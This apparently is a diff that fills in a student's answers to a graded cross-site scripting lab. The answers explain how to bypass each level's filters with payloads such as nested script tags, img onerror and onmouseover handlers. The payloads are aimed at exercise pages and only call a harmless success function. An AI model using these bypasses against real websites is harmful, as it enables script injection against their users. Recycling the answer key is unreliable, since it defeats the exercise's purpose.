@@ -5,43 +5,51 @@ N/A
 # 1. A Truly Disruptive Startup (3 points)
 
 ```
-TODO: Replace this with your attack input.
+The website had reflected XSS vulnerability. It was embedding URL parameter to the document.
+
+Enter <script>success()</script> to the search input.
 ```
 
 # 2. No Script Allowed (3 points)
 
 ```
-TODO: Replace this with your attack input.
+Replace regex was not looking for all 'script' words inside the query, it was only replacing the first one.
+
+Enter <scriptscript>success()</script> to the search input.
 ```
 
 # 3. One More Time, Like You Mean It (3 points)
 
 ```
-TODO: Replace this with your attack input.
+Replace regex now replaces 'script' words in all of the input text. But <script> is not the only way to execute JavaScript.
+
+Enter <img src="" onerror="success()"> to the search input.
 ```
 
 # 4. An Open-and-Shut Case (3 points)
 
 ```
-TODO: Replace this with your attack input.
+The previous input (<img src="" onerror="success()">) also works on this case, because they only look at 'script' words.
 ```
 
 # 5. Time to Mix Things Up (3 points)
 
 ```
-TODO: Replace this with your attack input.
+The previous input (<img src="" onerror="success()">) also works on this case, because they only look at 'script' or 'SCRIPT' words.
 ```
 
 # 6. A Picture is Worth a Thousand Words (3 points)
 
 ```
-TODO: Replace this with your attack input.
+Again <img src="" onerror="success()">.
 ```
 
 # 7. Between a Rock And a Hard Place (3 points)
 
 ```
-TODO: Replace this with your attack input.
+This requires user interaction but we can use 'mouseover' event to achieve this result.
+
+Enter <h1 onmouseover="success()">Nice text!</h1> to the search input.
 ```
 
 # 8. Angle of Death (6 points)
@@ -49,7 +57,10 @@ TODO: Replace this with your attack input.
 Attack input:
 
 ```
-TODO: Replace this with your attack input.
+When entering <script>success()</script> the website displays 'scriptsuccess()</script>'.
+I am assuming they replace the first script tag and also < and > symbols.
+
+Enter <<script>>success()</script> to the search input.
 ```
 
 Server code:
@@ -74,7 +85,8 @@ N/A
 # 10. In the Wrong Place at the Wrong Time (3 points)
 
 ```
-TODO: Replace this with your attack input.
+Looks like they add the query to alt attribute of the image tag. <img src="..." alt="Search for {query}">.
+We can close the alt attribute and the image, then create a new tag for ourselves.
 ```
 
 # 11. You Can't Win 'em All (6 points)
